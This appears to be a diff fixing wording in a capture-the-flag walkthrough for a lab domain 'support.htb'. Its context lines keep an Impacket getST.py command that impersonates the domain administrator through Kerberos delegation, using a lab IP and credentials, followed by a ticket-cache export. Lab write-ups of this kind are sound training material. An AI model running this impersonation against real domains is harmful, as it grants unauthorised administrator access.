@@ -324,7 +324,7 @@ Get the kerbers ticket
 ```
 getST.py -dc-ip 10.10.11.174 -spn www/dc.support.htb -impersonate administrator 'support.htb/user911:password@1'
 ```
-exporting env connect to dc as administrator
+exporting env and connect to dc as administrator
 ```
 KRB5CCNAME=administrator.ccache
 
